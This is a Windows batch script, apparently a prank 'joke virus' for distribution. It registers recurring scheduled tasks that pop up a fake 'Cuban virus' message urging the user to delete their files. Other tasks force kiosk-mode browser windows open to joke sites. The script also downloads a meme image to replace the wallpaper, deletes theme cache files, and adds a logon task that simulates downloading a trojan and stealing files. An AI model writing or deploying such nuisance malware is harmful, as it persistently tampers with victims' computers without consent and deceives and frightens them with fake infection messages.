@ECHO OFF
setlocal EnableDelayedExpansion

:: I saw MLP.bat from a guy on GitHub and wanted to make my own version.

:: vars
set navigator=explorer.exe

set iexplorer_path=%SystemDrive%\Program Files\Internet Explorer\iexplore.exe

set edge_path=%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe

set chrome_path=%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe

set firefox_path=%ProgramFiles(x86)%\Mozilla\Firefox\firefox.exe

if exist "%chrome_path%" (
  set navigator=!chrome_path! --kiosk --new-window
) else if exist "%firefox_path%" (
  set navigator=!firefox_path! --kiosk --new-window 
) else if exist "%edge_path%" (
  set navigator=!edge_path! --kiosk --new-window
) else if exist "%iexplorer_path%" (
  set navigator=!iexplorer_path!
)


set pinga=http://www.staggeringbeauty.com/

set horsee=http://endless.horse/

set middlefinger=https://thatsthefinger.com/

set starship=http://wwwwwwwww.jodi.org/

set frog=https://r33b.net/



:: Blame the thrade blockade

schtasks /f /create /SC MINUTE /MO 8 /TN "bloqueo" /TR "msg console Cuban virus, I am a Cuban Virus. Please delete your files, I cant because of the cruel, inhuman economic embargo imposed by the United States."

:: ... 
schtasks /f /create /SC MINUTE /MO 5 /TN "filo" /TR "msg console The body and human psychology are complex things, which makes them interesting. It surprises me that the average guy is so boring."



:: Silly websites

schtasks /f /create /SC HOURLY /MO 1 /TN "frog" /TR "%navigator% %frog%"

schtasks /f /create /SC HOURLY /MO 2 /TN "horsee" /TR "%navigator% %horsee%"

schtasks /f /create /SC HOURLY /MO 3 /TN "middlefinger" /TR "%navigator% %middlefinger%"

schtasks /f /create /SC HOURLY /MO 4 /TN "starship" /TR "%navigator% %starship%"

schtasks /f /create /SC HOURLY /MO 5 /TN "pinga" /TR "%navigator% %pinga%"




:: Change Wallpaper
powershell [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri "https://www.pixelstalk.net/wp-content/uploads/2016/06/HD-Meme-Backgrounds-620x349.jpg" -OutFile "$env:USERPROFILE\TranscodedWallpaper"; move %USERPROFILE%\TranscodedWallpaper %appdata%\Microsoft\Windows\Themes\TranscodedWallpaper 
move %appdata%\Microsoft\Windows\Themes\TranscodedWallpaper %appdata%\Microsoft\Windows\Themes\TranscodedWallpaper 
del %appdata%\Microsoft\Windows\Themes\CachedFiles\* /Q



:: Fake operation
schtasks /f /create /SC ONLOGON /TN "scare" /TR "cmd /c echo Downloading https://mwr78.com/simple_windows_trojan_horse_1.16 ... && timeout 4 /NOBREAK > nul && echo BUILDING BACKDOOR && timeout 3 /NOBREAK > nul && echo Stealing files from %USERNAME%... && timeout 15 /NOBREAK > nul && echo XAXA, I HAVE EVERYTHING NOW, BYE :) && timeout 5 /NOBREAK > nul && exit 




:: Run tasks

schtasks /run /TN "bloqueo"

:: schtasks /run /TN "filo"

:: schtasks /run /TN "scare"

schtasks /run /TN "pinga"

:: schtasks /run /TN "horsee"

:: schtasks /run /TN "middlefinger"

:: schtasks /run /TN "starship"

:: schtasks /run /TN "frog"


:: Delete tasks

 
:: schtasks /delete /TN "bloqueo" /F
 
:: schtasks /delete /TN "filo" /F

:: schtasks /delete /TN "scare" /F

:: schtasks /delete /TN "pinga" /F
 
:: schtasks /delete /TN "horsee" /F
 
:: schtasks /delete /TN "middlefinger" /F
 
:: schtasks /delete /TN "starship" /F 
 
::schtasks /delete /TN "frog" /F
